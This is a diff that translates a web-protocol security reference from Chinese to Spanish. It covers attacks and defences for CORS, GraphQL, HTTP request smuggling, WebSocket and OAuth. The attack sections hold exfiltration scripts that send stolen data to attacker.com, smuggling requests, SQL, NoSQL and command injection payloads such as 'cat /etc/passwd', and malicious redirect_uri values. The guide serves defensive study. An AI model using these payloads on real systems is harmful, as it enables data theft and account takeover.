@@ -1,51 +1,51 @@
-# 现代Web协议安全
+# Seguridad de protocolos Web modernos
 
-> **来源**: 基于WooYun漏洞库、OWASP及业界安全实践提炼，涵盖CORS、GraphQL、HTTP走私、WebSocket、OAuth五大现代Web协议攻击面。
-> **方法论**: WooYun漏洞本质公式 + L1-L4系统化分析
+> **Fuente**: elaborado a partir de la base de vulnerabilidades WooYun, OWASP y prácticas de seguridad de la industria, cubriendo cinco grandes superficies de ataque de protocolos Web modernos: CORS, GraphQL, HTTP request smuggling, WebSocket y OAuth.
+> **Metodología**: fórmula de esencia de vulnerabilidad de WooYun + análisis sistemático L1-L4
 
 ---
 
-## 一、CORS错误配置
+## I. Configuración incorrecta de CORS
 
-### 1.1 漏洞本质
+### 1.1 Esencia de la vulnerabilidad
 
 ```
-CORS风险 = Access-Control-Allow-Origin配置过宽 × 敏感接口缺乏额外鉴权
+Riesgo de CORS = Configuración demasiado permisiva de Access-Control-Allow-Origin × Falta de autorización adicional en interfaces sensibles
 ```
 
-浏览器同源策略本是安全屏障，CORS错误配置将其打破，允许恶意站点跨域读取用户敏感数据。
+La política de mismo origen del navegador es en sí misma una barrera de seguridad; una configuración incorrecta de CORS la rompe, permitiendo que un sitio malicioso lea datos sensibles del usuario de forma cross-origin.
 
-### 1.2 检测方法
+### 1.2 Métodos de detección
 
 ```bash
-# 基础检测: 发送自定义Origin观察响应
+# Detección básica: enviar un Origin personalizado y observar la respuesta
 curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
-# 检查响应头:
-# Access-Control-Allow-Origin: https://evil.com  → 危险!
-# Access-Control-Allow-Credentials: true          → 可携带Cookie跨域请求
+# Verificar las cabeceras de respuesta:
+# Access-Control-Allow-Origin: https://evil.com  → ¡peligroso!
+# Access-Control-Allow-Credentials: true          → puede llevar Cookie en peticiones cross-origin
 ```
 
-**危险配置模式**
+**Patrones de configuración peligrosos**
 
-| 模式 | 风险 | 说明 |
+| Patrón | Riesgo | Descripción |
 |------|------|------|
-| `Access-Control-Allow-Origin: *` | 高 | 通配符，任意域可读取(但不可带Cookie) |
-| 动态反射Origin | 极高 | 将请求Origin直接作为响应头返回 |
-| `null` Origin允许 | 高 | `<iframe sandbox>`可构造null来源 |
-| 正则匹配缺陷 | 高 | `evil.com.attacker.com`匹配`evil.com` |
-| 子域通配 | 中 | `*.target.com`含已失控的子域 |
+| `Access-Control-Allow-Origin: *` | Alto | Comodín, cualquier dominio puede leer (pero sin Cookie) |
+| Reflejo dinámico de Origin | Muy alto | El Origin de la petición se devuelve directamente como cabecera de respuesta |
+| Se permite Origin `null` | Alto | Un `<iframe sandbox>` puede construir un origen null |
+| Defecto en coincidencia por regex | Alto | `evil.com.attacker.com` coincide con `evil.com` |
+| Comodín de subdominio | Medio | `*.target.com` incluye subdominios ya comprometidos |
 
-### 1.3 利用方式
+### 1.3 Modo de explotación
 
 ```html
-<!-- 恶意页面: 跨域窃取用户数据 -->
+<!-- Página maliciosa: robo de datos de usuario cross-origin -->
 <script>
 fetch('https://target.com/api/userinfo', {credentials: 'include'})
   .then(r => r.json())
   .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
 </script>
 
-<!-- null Origin利用 -->
+<!-- Explotación con Origin null -->
 <iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
 <script>
 fetch('https://target.com/api/userinfo',{credentials:'include'})
@@ -54,105 +54,105 @@ fetch('https://target.com/api/userinfo',{credentials:'include'})
 </iframe>
 ```
 
-### 1.4 防御措施
+### 1.4 Medidas de defensa
 
-- **严格白名单校验Origin**：不要动态反射，使用精确匹配列表
-- 避免`Access-Control-Allow-Origin: *`与`Access-Control-Allow-Credentials: true`同时使用
-- 避免允许`null` Origin
-- 正则匹配必须锚定(^和$)，防止子串匹配绕过
-- 敏感接口增加CSRF Token等额外鉴权，不仅依赖CORS
+- **Verificación estricta de Origin mediante lista blanca**: no reflejar dinámicamente, usar una lista de coincidencia exacta
+- Evitar usar `Access-Control-Allow-Origin: *` junto con `Access-Control-Allow-Credentials: true`
+- Evitar permitir Origin `null`
+- La coincidencia por regex debe anclarse (^ y $) para evitar bypass por coincidencia de subcadena
+- Añadir autorización adicional (como CSRF Token) en interfaces sensibles, no depender únicamente de CORS
 
 ---
 
-## 二、GraphQL安全
+## II. Seguridad de GraphQL
 
-### 2.1 漏洞本质
+### 2.1 Esencia de la vulnerabilidad
 
 ```
-GraphQL风险 = 强大的查询能力 × 默认开放的内省机制 × 缺乏细粒度鉴权
+Riesgo de GraphQL = Potente capacidad de consulta × Mecanismo de introspección abierto por defecto × Falta de autorización de grano fino
 ```
 
-GraphQL单一端点暴露全部数据模型，内省机制提供完整API文档，攻击者无需猜测接口。
+GraphQL expone todo el modelo de datos a través de un único endpoint; el mecanismo de introspección proporciona documentación completa de la API, por lo que el atacante no necesita adivinar los endpoints.
 
-### 2.2 内省查询 - 信息泄露
+### 2.2 Consulta de introspección - fuga de información
 
 ```graphql
-# 获取完整Schema（类型、字段、参数）
+# Obtener el Schema completo (tipos, campos, parámetros)
 {__schema{types{name,fields{name,args{name,type{name}}}}}}
 
-# 精简版：仅获取查询类型
+# Versión reducida: obtener solo el tipo de consulta
 {__schema{queryType{name,fields{name}}}}
 
-# 获取mutation列表
+# Obtener la lista de mutations
 {__schema{mutationType{name,fields{name,args{name}}}}}
 ```
 
-### 2.3 常见攻击向量
+### 2.3 Vectores de ataque comunes
 
-**注入攻击**
+**Ataques de inyección**
 
 ```graphql
-# 参数拼接导致SQL注入
+# La concatenación de parámetros provoca inyección SQL
 { user(name: "admin' OR '1'='1") { id email } }
 
-# NoSQL注入
+# Inyección NoSQL
 { user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
 ```
 
-**批量查询DoS（嵌套查询耗尽资源）**
+**DoS por consultas masivas (consultas anidadas que agotan recursos)**
 
 ```graphql
-# 深度嵌套 - 指数级数据库查询
+# Anidación profunda - consultas a base de datos de crecimiento exponencial
 { user(id:1) { friends { friends { friends { friends { name } } } } } }
 
-# 别名批量查询 - 单次请求枚举大量数据
+# Consultas masivas mediante alias - enumeración de grandes volúmenes de datos en una sola petición
 { a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }
 
-# 批量mutation暴力破解
+# Fuerza bruta mediante mutation en lote
 mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
 ```
 
-**认证绕过**
+**Bypass de autenticación**
 
 ```graphql
-# mutation缺少鉴权检查
+# La mutation carece de verificación de autorización
 mutation { deleteUser(id: 1) { success } }
 mutation { updateRole(userId: 1, role: "admin") { success } }
 ```
 
-### 2.4 防御措施
+### 2.4 Medidas de defensa
 
-- **禁用生产环境内省查询**：检查`__schema`/`__type`请求并拒绝
-- 查询深度限制(推荐最大10层)与复杂度分析
-- 速率限制与查询超时(防批量/嵌套DoS)
-- 字段级权限控制(每个resolver独立鉴权)
-- 输入参数化处理(防注入)、禁止字符串拼接构建查询
-- 使用持久化查询(Persisted Queries)，仅允许预注册的查询执行
+- **Deshabilitar la consulta de introspección en producción**: verificar las peticiones `__schema`/`__type` y rechazarlas
+- Límite de profundidad de consulta (se recomienda un máximo de 10 niveles) y análisis de complejidad
+- Límite de tasa y timeout de consulta (contra DoS por lotes/anidación)
+- Control de permisos a nivel de campo (cada resolver con su propia autorización)
+- Parametrizar los parámetros de entrada (contra inyección), prohibir construir consultas mediante concatenación de cadenas
+- Usar consultas persistidas (Persisted Queries), permitiendo ejecutar solo consultas preregistradas
 
 ---
 
-## 三、HTTP请求走私
+## III. HTTP Request Smuggling
 
-### 3.1 漏洞本质
+### 3.1 Esencia de la vulnerabilidad
 
 ```
-前端代理(CDN/LB) 与 后端服务器 对HTTP请求边界的解析不一致
-→ 一个TCP连接中"走私"了额外的请求 → 影响其他用户的请求处理
+El proxy frontend (CDN/LB) y el servidor backend interpretan de forma inconsistente los límites de una petición HTTP
+→ se "contrabandea" una petición adicional dentro de una misma conexión TCP → afecta el procesamiento de peticiones de otros usuarios
 ```
 
-核心矛盾：`Content-Length`(CL) 与 `Transfer-Encoding: chunked`(TE) 同时存在时，前后端选择不同的头部进行解析。
+Contradicción central: cuando `Content-Length` (CL) y `Transfer-Encoding: chunked` (TE) están presentes simultáneamente, el frontend y el backend eligen cabeceras distintas para el análisis.
 
-### 3.2 三种攻击类型
+### 3.2 Tres tipos de ataque
 
-| 类型 | 前端解析 | 后端解析 | 说明 |
+| Tipo | Análisis del frontend | Análisis del backend | Descripción |
 |------|----------|----------|------|
-| CL.TE | Content-Length | Transfer-Encoding | 前端按CL转发，后端按TE解析 |
-| TE.CL | Transfer-Encoding | Content-Length | 前端按TE转发，后端按CL解析 |
-| TE.TE | Transfer-Encoding | Transfer-Encoding | 混淆TE头使一方忽略 |
+| CL.TE | Content-Length | Transfer-Encoding | El frontend reenvía según CL, el backend interpreta según TE |
+| TE.CL | Transfer-Encoding | Content-Length | El frontend reenvía según TE, el backend interpreta según CL |
+| TE.TE | Transfer-Encoding | Transfer-Encoding | Se ofusca la cabecera TE para que una de las partes la ignore |
 
-### 3.3 经典Payload
+### 3.3 Payload clásico
 
-**CL.TE走私**
+**Smuggling CL.TE**
 
 ```http
 POST / HTTP/1.1
@@ -165,7 +165,7 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 
-**TE.CL走私**
+**Smuggling TE.CL**
 
 ```http
 POST / HTTP/1.1
@@ -179,7 +179,7 @@ SMUGGLED
 
 ```
 
-**TE.TE混淆变体**
+**Variante de ofuscación TE.TE**
 
 ```http
 Transfer-Encoding: chunked
@@ -190,159 +190,159 @@ Transfer-Encoding: identity
 Transfer-Encoding:chunked
 ```
 
-### 3.4 检测与利用
+### 3.4 Detección y explotación
 
 ```
-检测方法:
-1. 发送CL/TE冲突请求，观察超时/响应异常
-2. 走私一个不完整请求，看后续请求是否受影响
-3. 工具: Burp Suite HTTP Request Smuggler扩展
+Métodos de detección:
+1. Enviar una petición con conflicto CL/TE y observar timeout/respuesta anómala
+2. Contrabandear una petición incompleta y ver si afecta a la siguiente petición
+3. Herramienta: extensión HTTP Request Smuggler de Burp Suite
 
-利用场景:
-- 绕过前端WAF/ACL → 走私恶意请求到后端
-- 劫持其他用户请求 → 窃取Cookie/Session
-- 缓存投毒 → 走私请求污染CDN缓存内容
-- 请求路由劫持 → 将请求导向任意后端
+Escenarios de explotación:
+- Bypass de WAF/ACL frontal → contrabandear una petición maliciosa hacia el backend
+- Secuestro de peticiones de otros usuarios → robo de Cookie/Session
+- Envenenamiento de caché → contrabandear una petición para contaminar el contenido cacheado en el CDN
+- Secuestro de enrutamiento de peticiones → dirigir la petición hacia un backend arbitrario
 ```
 
-### 3.5 防御措施
+### 3.5 Medidas de defensa
 
-- 前后端使用统一的HTTP解析库/版本
-- 禁止同时出现CL和TE头，拒绝模糊请求
-- 禁用HTTP/1.0 Keep-Alive后端连接复用
-- 升级到HTTP/2(二进制帧协议，天然免疫CL/TE歧义)
-- CDN/LB配置规范化请求头后再转发
+- Usar la misma librería/versión de análisis HTTP en frontend y backend
+- Prohibir que aparezcan simultáneamente las cabeceras CL y TE, rechazar peticiones ambiguas
+- Deshabilitar la reutilización de conexión Keep-Alive de backend en HTTP/1.0
+- Actualizar a HTTP/2 (protocolo de frames binario, inmune por naturaleza a la ambigüedad CL/TE)
+- Normalizar las cabeceras de la petición en el CDN/LB antes de reenviarlas
 
 ---
 
-## 四、WebSocket安全
+## IV. Seguridad de WebSocket
 
-### 4.1 漏洞本质
+### 4.1 Esencia de la vulnerabilidad
 
 ```
-WebSocket风险 = HTTP握手后脱离传统安全模型 × 持久双向通道缺乏逐消息鉴权
+Riesgo de WebSocket = Tras el handshake HTTP se sale del modelo de seguridad tradicional × Canal bidireccional persistente sin autorización por mensaje
 ```
 
-WebSocket连接一旦建立，后续消息不再经过标准HTTP安全机制(Cookie SameSite/CSRF Token等)。
+Una vez establecida la conexión WebSocket, los mensajes posteriores ya no pasan por los mecanismos de seguridad HTTP estándar (Cookie SameSite/CSRF Token, etc.).
 
-### 4.2 跨站WebSocket劫持(CSWSH)
+### 4.2 Secuestro de WebSocket entre sitios (CSWSH)
 
 ```html
-<!-- 恶意页面: 劫持用户WebSocket连接 -->
+<!-- Página maliciosa: secuestro de la conexión WebSocket del usuario -->
 <script>
 var ws = new WebSocket('wss://target.com/ws');
 ws.onopen = function() {
-    ws.send('{"action":"getPrivateData"}');  // 以受害者身份发送请求
+    ws.send('{"action":"getPrivateData"}');  // enviar petición suplantando a la víctima
 };
 ws.onmessage = function(e) {
-    // 窃取响应数据
+    // robar los datos de respuesta
     fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
 };
 </script>
 ```
 
-**原理**：WebSocket握手是标准HTTP请求，浏览器会自动携带Cookie。若服务端不验证Origin头，恶意页面可建立经过认证的ws连接。
+**Principio**: el handshake de WebSocket es una petición HTTP estándar, y el navegador incluye la Cookie automáticamente. Si el servidor no valida la cabecera Origin, una página maliciosa puede establecer una conexión ws autenticada.
 
-### 4.3 消息注入
+### 4.3 Inyección de mensajes
 
 ```javascript
-// 通过WebSocket发送注入payload
-ws.send('{"query": "admin\' OR 1=1--"}');          // SQL注入
+// Enviar payload de inyección a través de WebSocket
+ws.send('{"query": "admin\' OR 1=1--"}');          // Inyección SQL
 ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
-ws.send('{"cmd": "ls; cat /etc/passwd"}');           // 命令注入
+ws.send('{"cmd": "ls; cat /etc/passwd"}');           // Inyección de comandos
 ```
 
-### 4.4 认证不足
+### 4.4 Autenticación insuficiente
 
-| 问题 | 风险 | 说明 |
+| Problema | Riesgo | Descripción |
 |------|------|------|
-| 仅握手时认证 | Session过期后连接仍有效 | ws连接可持续数小时 |
-| 无消息级鉴权 | 任何已连接客户端可执行全部操作 | 缺乏per-message授权检查 |
-| Token明文传输 | WebSocket不加密(ws://) | 使用wss://强制加密 |
+| Autenticación solo en el handshake | La conexión sigue válida tras expirar la Session | Una conexión ws puede durar horas |
+| Sin autorización a nivel de mensaje | Cualquier cliente conectado puede ejecutar todas las operaciones | Falta de verificación de autorización per-message |
+| Token transmitido en texto plano | WebSocket sin cifrar (ws://) | Usar wss:// para forzar el cifrado |
 
-### 4.5 防御措施
+### 4.5 Medidas de defensa
 
-- **验证Origin头**：握手时检查Origin是否在白名单内(防CSWSH)
-- **Token鉴权**：握手时通过URL参数或首条消息传递Token(不依赖Cookie)
-- **消息校验**：对每条消息做输入验证和输出编码(防注入)
-- 使用wss://强制加密传输
-- 实现心跳机制和Session超时自动断开
-- 消息速率限制(防DoS)
+- **Verificar la cabecera Origin**: comprobar si el Origin está en la lista blanca durante el handshake (contra CSWSH)
+- **Autenticación mediante Token**: transmitir el Token durante el handshake vía parámetro de URL o primer mensaje (sin depender de Cookie)
+- **Validación de mensajes**: aplicar validación de entrada y codificación de salida en cada mensaje (contra inyección)
+- Usar wss:// para forzar el cifrado del transporte
+- Implementar mecanismo de heartbeat y desconexión automática por timeout de Session
+- Límite de tasa de mensajes (contra DoS)
 
 ---
 
-## 五、OAuth 2.0/OIDC安全
+## V. Seguridad de OAuth 2.0/OIDC
 
-### 5.1 漏洞本质
-
-```
-OAuth风险 = 复杂的多方交互流程 × 参数校验不严格 × 实现偏离规范
-```
-
-OAuth授权流程涉及客户端、授权服务器、资源服务器三方交互，任何一环配置不当都可导致Token泄露或账户接管。
-
-### 5.2 redirect_uri操纵
+### 5.1 Esencia de la vulnerabilidad
 
 ```
-# 正常流程
+Riesgo de OAuth = Flujo de interacción multiparte complejo × Validación de parámetros poco estricta × Implementación que se desvía de la especificación
+```
+
+El flujo de autorización de OAuth involucra la interacción de tres partes: cliente, servidor de autorización y servidor de recursos; una configuración incorrecta en cualquiera de estos eslabones puede provocar la fuga de Token o la toma de control de la cuenta.
+
+### 5.2 Manipulación de redirect_uri
+
+```
+# Flujo normal
 https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback
 
-# 攻击: 篡改redirect_uri窃取授权码
-redirect_uri=https://attacker.com/steal           # 完全替换
-redirect_uri=https://app.com.attacker.com/callback # 子域混淆
-redirect_uri=https://app.com/callback/../../../attacker # 路径遍历
-redirect_uri=https://app.com/callback?next=https://attacker.com # 开放重定向链
+# Ataque: manipular redirect_uri para robar el código de autorización
+redirect_uri=https://attacker.com/steal           # Reemplazo completo
+redirect_uri=https://app.com.attacker.com/callback # Confusión de subdominio
+redirect_uri=https://app.com/callback/../../../attacker # Traversal de rutas
+redirect_uri=https://app.com/callback?next=https://attacker.com # Cadena de redirección abierta
 ```
 
-### 5.3 常见攻击向量
+### 5.3 Vectores de ataque comunes
 
-| 攻击类型 | 原理 | 利用条件 |
+| Tipo de ataque | Principio | Condición de explotación |
 |----------|------|----------|
-| CSRF攻击 | state参数缺失或可预测 | 将攻击者账号绑定到受害者 |
-| Token泄露(Referer) | 隐式模式token在URL Fragment中 | 页面含外部资源引用 |
-| Token泄露(日志) | 授权码/token记录在服务端日志 | 日志可访问 |
-| PKCE绕过 | 公共客户端未使用code_challenge | 拦截授权码即可换取token |
-| IdP混淆(Mix-Up) | 多IdP场景下混淆授权响应来源 | 客户端支持多个OAuth提供商 |
-| 授权码重放 | 授权码未一次性使用 | 拦截授权码后重复兑换 |
+| Ataque CSRF | El parámetro state falta o es predecible | Vincular la cuenta del atacante a la de la víctima |
+| Fuga de Token (Referer) | En el modo implícito, el token está en el Fragment de la URL | La página contiene referencias a recursos externos |
+| Fuga de Token (logs) | El código de autorización/token se registra en los logs del servidor | Los logs son accesibles |
+| Bypass de PKCE | El cliente público no usa code_challenge | Basta con interceptar el código de autorización para canjear el token |
+| Confusión de IdP (Mix-Up) | Confusión del origen de la respuesta de autorización en escenarios con múltiples IdP | El cliente soporta varios proveedores OAuth |
+| Reproducción del código de autorización | El código de autorización no es de un solo uso | Interceptar el código de autorización y canjearlo repetidamente |
 
-### 5.4 CSRF与state参数
-
-```
-# 攻击流程 (state缺失时)
-1. 攻击者发起OAuth授权，获取自己账号的授权码
-2. 构造链接: https://app.com/callback?code=ATTACKER_CODE
-3. 诱骗受害者点击 → 受害者账号绑定攻击者的第三方账号
-4. 攻击者用第三方账号登录 → 接管受害者账户
-
-# 防御: state参数
-state=随机不可预测值(绑定用户Session)
-→ 回调时校验state与Session匹配
-```
-
-### 5.5 隐式模式风险
+### 5.4 CSRF y el parámetro state
 
 ```
-# 隐式模式(Implicit Flow) - 已不推荐
+# Flujo de ataque (cuando falta state)
+1. El atacante inicia la autorización OAuth y obtiene el código de autorización de su propia cuenta
+2. Construye el enlace: https://app.com/callback?code=ATTACKER_CODE
+3. Engaña a la víctima para que haga clic → la cuenta de la víctima se vincula a la cuenta de terceros del atacante
+4. El atacante inicia sesión con su cuenta de terceros → toma el control de la cuenta de la víctima
+
+# Defensa: parámetro state
+state=valor aleatorio impredecible (vinculado a la Session del usuario)
+→ al recibir el callback, verificar que state coincida con la Session
+```
+
+### 5.5 Riesgos del modo implícito
+
+```
+# Modo implícito (Implicit Flow) - ya no se recomienda
 https://app.com/callback#access_token=eyJ...&token_type=bearer
 
-风险:
-- Token在URL Fragment中，可被浏览器历史/Referer头泄露
-- 无法使用refresh_token，用户体验差
-- 无法绑定客户端身份(无client_secret)
+Riesgos:
+- El Token está en el Fragment de la URL, puede filtrarse por el historial del navegador/cabecera Referer
+- No se puede usar refresh_token, mala experiencia de usuario
+- No se puede vincular la identidad del cliente (sin client_secret)
 
-→ 替代方案: Authorization Code Flow + PKCE
+→ Alternativa: Authorization Code Flow + PKCE
 ```
 
-### 5.6 防御措施
+### 5.6 Medidas de defensa
 
-- **严格redirect_uri白名单**：精确匹配(不允许通配符/子路径)
-- **强制state参数**：绑定Session、不可预测、一次性使用
-- **强制PKCE**：所有客户端(尤其公共客户端/SPA)必须使用code_challenge
-- 使用Authorization Code Flow，弃用Implicit Flow
-- 授权码一次性使用，短有效期(推荐10分钟内)
-- Token绑定(DPoP/mTLS)防止Token被盗用
-- 定期审计已授权的第三方应用和权限范围
+- **Lista blanca estricta de redirect_uri**: coincidencia exacta (no permitir comodines/subrutas)
+- **Forzar el parámetro state**: vinculado a la Session, impredecible, de un solo uso
+- **Forzar PKCE**: todos los clientes (especialmente los públicos/SPA) deben usar code_challenge
+- Usar Authorization Code Flow, descartar Implicit Flow
+- El código de autorización de un solo uso, con vigencia corta (se recomienda dentro de 10 minutos)
+- Vinculación de Token (DPoP/mTLS) para evitar el uso indebido de Token robados
+- Auditar periódicamente las aplicaciones de terceros autorizadas y su alcance de permisos
 
 ---
 
-*基于WooYun漏洞库(88,636条)提炼 + OWASP/RFC安全标准 | 仅供安全研究与防御参考*
+*Elaborado a partir de la base de vulnerabilidades WooYun (88,636 registros) + estándares de seguridad OWASP/RFC | Solo para investigación de seguridad y referencia defensiva*
